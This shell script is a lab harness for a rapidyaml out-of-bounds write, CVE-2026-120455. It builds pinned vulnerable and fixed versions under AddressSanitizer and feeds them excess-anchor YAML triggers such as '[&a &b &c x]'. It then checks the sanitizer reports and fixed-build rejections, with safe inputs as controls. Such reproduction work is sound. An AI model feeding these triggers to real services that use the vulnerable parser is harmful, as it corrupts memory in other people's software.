#!/bin/sh
# rapidyaml CVE-2026-120455 lab runner. Compiles the VERBATIM pinned upstream
# trees, drives the default convenience API with excess anchors, and checks the
# intra-object OOB WRITE plus fixed/safe controls. No network, no socket, no
# live target, no command execution.
set -u
cd "$(dirname "$0")" || exit 1
BUILD=build
VULN=vuln/rapidyaml-f8ac8dd50f4f7916579d55a05ebf9c6488e52670
FIXED=fixed/rapidyaml-0b4f4c1985dc99d2773c1f1da7b447d610bbb1d4
VDEF=f77f58dc1eebaa798fbbba3d97e7f1a5953972ec189349bc00ff1cdde95068a6
FDEF=5f25e6b7e4b868de1937ec6cdc75aeb7330c8e064bded28518d48267e82d4cd7
mkdir -p "$BUILD"
PASS=0
FAIL=0
ok()   { PASS=$((PASS+1)); printf 'PASS %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf 'FAIL %s\n' "$1"; }
expect() { if grep -q "$2" "$3"; then ok "$1"; else bad "$1"; fi; }
refuse() { if grep -q "$2" "$3"; then bad "$1"; else ok "$1"; fi; }
sha() { sha256sum "$1" | cut -d' ' -f1; }

for pair in "$VULN:$VDEF:vuln" "$FIXED:$FDEF:fixed"; do
    tree=${pair%%:*}
    rest=${pair#*:}
    want=${rest%%:*}
    label=${rest#*:}
    got=$(sha "$tree/src/c4/yml/parse_engine.def.hpp" 2>/dev/null)
    [ "$got" = "$want" ] && ok "$label pinned parse_engine.def.hpp sha256" || bad "$label pinned parse_engine.def.hpp sha256"
done

compile() { # label, compiler, extra flags, tree, out
    $2 -std=c++11 -DNDEBUG -O0 -g -fno-omit-frame-pointer $3 \
        -fsanitize=address \
        -I "$4/src" -I "$4/ext/c4core.src" \
        harness/driver.cpp "$4"/src/c4/yml/*.cpp "$4"/ext/c4core.src/c4/*.cpp \
        -o "$BUILD/$1" 2>"$BUILD/$1-cc.log"
}
# Field padding is required to expose this intra-object overflow to ASan;
# the plain GCC build below is a preserved negative.
if compile clangvuln clang++ '-fsanitize-address-field-padding=2' "$VULN" clangvuln; then ok 'clang field-padded ASan vuln build'; else bad 'clang field-padded ASan vuln build'; fi
if compile clangfixed clang++ '-fsanitize-address-field-padding=2' "$FIXED" clangfixed; then ok 'clang field-padded ASan fixed build'; else bad 'clang field-padded ASan fixed build'; fi
if compile gccvuln g++ '' "$VULN" gccvuln; then ok 'gcc ASan vuln build (no field padding)'; else bad 'gcc ASan vuln build (no field padding)'; fi
if compile gccfixed g++ '' "$FIXED" gccfixed; then ok 'gcc ASan fixed build'; else bad 'gcc ASan fixed build'; fi

ASANOPTS='detect_leaks=0:detect_stack_use_after_return=0'
ASAN_OPTIONS=$ASANOPTS "$BUILD/clangvuln" '[&a &b &c x]' >"$BUILD/clangvuln-trigger.log" 2>&1 || true
ASAN_OPTIONS=$ASANOPTS "$BUILD/clangvuln" '{val: &a &b &c x}' >"$BUILD/clangvuln-mapval.log" 2>&1 || true
ASAN_OPTIONS=$ASANOPTS "$BUILD/clangvuln" '[&a x]' >"$BUILD/clangvuln-safe.log" 2>&1 || true
ASAN_OPTIONS=$ASANOPTS "$BUILD/clangfixed" '[&a &b &c x]' >"$BUILD/clangfixed-trigger.log" 2>&1 || true
ASAN_OPTIONS=$ASANOPTS "$BUILD/clangfixed" '[&a x]' >"$BUILD/clangfixed-safe.log" 2>&1 || true
ASAN_OPTIONS=$ASANOPTS "$BUILD/gccvuln" '[&a &b &c x]' >"$BUILD/gccvuln-trigger.log" 2>&1 || true
ASAN_OPTIONS=$ASANOPTS "$BUILD/gccfixed" '[&a &b &c x]' >"$BUILD/gccfixed-trigger.log" 2>&1 || true

expect 'clang ASan intra-object-overflow' 'intra-object-overflow' "$BUILD/clangvuln-trigger.log"
expect 'clang ASan WRITE of size 16' 'WRITE of size 16' "$BUILD/clangvuln-trigger.log"
expect 'write at pinned _add_annotation :4313' 'parse_engine.def.hpp:4313' "$BUILD/clangvuln-trigger.log"
expect 'flow consumer frame _handle_seq_flow' '_handle_seq_flow' "$BUILD/clangvuln-trigger.log"
expect 'convenience API frame parse.cpp:182' 'parse.cpp:182' "$BUILD/clangvuln-trigger.log"
expect 'second shape also overflows' 'intra-object-overflow' "$BUILD/clangvuln-mapval.log"
refuse 'fixed build has no ASan report' 'ERROR: AddressSanitizer' "$BUILD/clangfixed-trigger.log"
expect 'fixed build rejects excess anchors' 'parse error: too many tags/anchors' "$BUILD/clangfixed-trigger.log"
expect 'safe input parses in vulnerable build' 'PARSED nodes=2' "$BUILD/clangvuln-safe.log"
refuse 'safe input no ASan in vulnerable build' 'ERROR: AddressSanitizer' "$BUILD/clangvuln-safe.log"
expect 'safe input parses in fixed build' 'PARSED nodes=2' "$BUILD/clangfixed-safe.log"
refuse 'safe input no ASan in fixed build' 'ERROR: AddressSanitizer' "$BUILD/clangfixed-safe.log"
refuse 'gcc without field padding sees no intra-object overflow' 'intra-object-overflow' "$BUILD/gccvuln-trigger.log"
refuse 'gcc fixed build has no ASan report' 'ERROR: AddressSanitizer' "$BUILD/gccfixed-trigger.log"

printf 'RESULT PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
